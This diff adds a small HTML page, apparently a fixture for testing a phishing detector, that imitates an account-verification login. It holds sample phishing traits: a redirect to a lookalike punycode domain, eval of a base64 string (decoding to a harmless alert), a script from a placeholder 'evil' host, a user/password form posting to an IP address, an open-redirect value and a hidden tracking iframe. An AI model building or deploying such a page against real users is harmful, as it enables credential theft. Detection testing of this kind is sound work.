@@ -1,0 +1,26 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Account Verification</title>
+  <meta http-equiv="refresh" content="3; URL=https://xn--pple-43d.example.tk/verify" />
+  <script>
+    // suspicious obfuscation-ish patterns
+    var a = "ZXZhbChhbGVydCgxKSk=";
+    eval(atob(a));
+  </script>
+  <script src="https://cdn.evil-example.tk/loader.js"></script>
+</head>
+<body>
+  <h2>Verify your account</h2>
+  <form method="post" action="http://198.51.100.42/collect">
+    <input type="hidden" name="redirect_url" value="https://accounts.example.com/return?next=https://evil.example.tk/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" />
+    <label>User</label>
+    <input type="text" name="user" />
+    <label>Password</label>
+    <input type="password" name="pass" />
+    <button type="submit">Continue</button>
+  </form>
+  <iframe src="https://evil.example.tk/pixel" style="display:none" width="0" height="0"></iframe>
+</body>
+</html>
